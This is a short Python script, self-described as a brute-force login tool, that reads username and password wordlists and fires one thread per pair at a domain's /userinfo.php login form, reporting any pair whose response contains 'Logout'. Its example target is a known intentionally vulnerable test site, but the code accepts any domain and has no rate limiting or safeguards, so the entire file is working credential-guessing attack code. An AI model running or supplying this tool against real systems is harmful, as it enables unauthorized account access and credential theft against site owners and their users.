import requests
import threading
import argparse

# Setup argparse for optional username/password file input
parser = argparse.ArgumentParser(description="Brute-force login tool")
parser.add_argument("-u", "--userfile", default="username.txt", help="File containing usernames")
parser.add_argument("-p", "--passfile", default="pass.txt", help="File containing passwords")
args = parser.parse_args()

# Take domain as input at runtime
domain = input("Enter the target domain (e.g., testphp.vulnweb.com): ").strip()

# Build URL
url = f"http://{domain}/userinfo.php"

# Load usernames and passwords from files
with open(args.userfile, "r") as ufile:
    user_list = [u.strip() for u in ufile.readlines()]

with open(args.passfile, "r") as pfile:
    pass_list = [p.strip() for p in pfile.readlines()]

# Login function
def login(username, password):
    s = requests.Session()
    res = s.post(url, data={"uname": username, "pass": password})
    if "Logout" in res.text:
        print(f"✅ Success! Username: '{username}' Password: '{password}'")

# Start brute-force threads
for username in user_list:
    for password in pass_list:
        t = threading.Thread(target=login, args=(username, password))
        t.start()
